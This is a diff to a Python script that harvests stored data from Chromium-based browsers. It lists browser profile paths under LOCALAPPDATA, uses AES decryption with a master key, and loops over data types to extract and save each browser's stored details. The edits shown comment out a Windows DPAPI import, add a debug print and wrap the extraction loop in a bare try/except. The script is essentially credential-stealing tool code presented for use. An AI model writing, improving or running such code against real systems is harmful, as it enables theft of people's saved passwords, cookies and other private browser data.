@@ -6,9 +6,10 @@ import sqlite3
 from datetime import datetime, timedelta
 
 from Crypto.Cipher import AES
-from win32crypt import CryptUnprotectData
+#from win32crypt import CryptUnprotectData
 
 appdata = os.getenv('LOCALAPPDATA')
+print(appdata)
 
 browsers = {
     'avast': appdata + '\\AVAST Software\\Browser\\User Data',
@@ -148,7 +149,11 @@ if __name__ == '__main__':
         print(f"Getting Stored Details from {browser}")
 
         for data_type_name, data_type in data_queries.items():
-            print(f"\t [!] Getting {data_type_name.replace('_', ' ').capitalize()}")
-            data = get_data(browser_path, "Default", master_key, data_type)
-            save_results(browser, data_type_name, data)
-            print("\t------\n")
+            try:
+                getting = data_type_name.replace('_', ' ').capitalize()
+                print(f"\t [!] Getting {getting}")
+                data = get_data(browser_path, "Default", master_key, data_type)
+                save_results(browser, data_type_name, data)
+                print("\t------\n")
+            except:
+                print(f"something went wrong with {browser} -> {getting}")
